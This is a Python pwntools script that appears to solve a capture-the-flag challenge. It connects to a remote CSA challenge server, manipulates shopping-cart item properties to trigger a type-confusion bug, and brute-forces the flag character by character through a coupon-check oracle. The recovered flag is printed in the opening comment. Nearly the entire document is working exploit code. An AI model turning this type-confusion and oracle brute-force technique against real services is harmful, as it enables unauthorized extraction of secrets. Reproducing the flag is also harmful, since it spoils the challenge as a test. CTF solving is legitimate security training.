# Flag: CSA{Typ3_C0nFu510n_iS_a_ReAL_Pr0bL3m}
from pwn import *
c=remote("csa-2.csa-challenge.com", 2222)
# context.log_level='debug'
flag = "CSA{Typ3_"
length = 10
PRINTABLE = '_!$,?@0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ#%&()*+-./:;<=>[]^`{|}~'
d ={'TYPE':'1','KILOGRAMS':'2','ITEMS':'3','LOAVES':'4','LITERS':'5','DESCRIPTION':'6','CANCEL':'7'}
types = {'BREAD' : 'b',
	'PASTA'    : 'p',
	'SOUP'     : 's',
    'DRINK'    : 'd',
    'VEGETABLE': 'v',
	'FRUIT'    : 'f',
    'COUPON'   : 'c'}
# FUNCTIONS
def add_item( item_type):
	c.sendline(b'1')
	c.recv()
	c.sendline( types[item_type] )
	c.recv()


def remove_from_cart( idx ):
	c.sendline(b'3')
	c.sendlineafter(b'Which item index would you like to remove?\r\n', str(idx))
	c.recv()

def edit_at_index( idx):
	c.sendline(b'2')
	c.recvuntil('Which item index would you like to edit?\r\n')
	c.sendline( str(idx) )
	c.recv()

def edit_property( property_name,new_val):
	c.sendline( d[property_name] )
	c.recv()
	if new_val !=  None:
		c.sendline( str(new_val) )
		c.recv()

def apply_coupon(guessed_flag ):
	c.sendline(b'5')
	c.sendlineafter(b'Please enter your coupon:\r\n',guessed_flag)
	answer = c.recv()
	return b'Applied coupon for 100% OFF!' in answer


c.recv()
apply_coupon(b'XXX')
edit_at_index(0)
edit_property('CANCEL',None)
edit_at_index(1)
edit_property('CANCEL',None)


while flag[-1] != '}':
	move_on = False
	for char in PRINTABLE:

		edit_at_index(2)
		edit_property('LOAVES',length)
		edit_at_index(2)
		edit_property('ITEMS',0)
		edit_at_index(2)
		if apply_coupon(flag+char):
			flag+=char
			length+=1
			move_on =True
			print(flag)

		remove_from_cart(2)
		add_item('FRUIT')
		if move_on:
			edit_at_index(2)
			edit_property('KILOGRAMS', 0)
			break
	else:
		print("FAILED!")

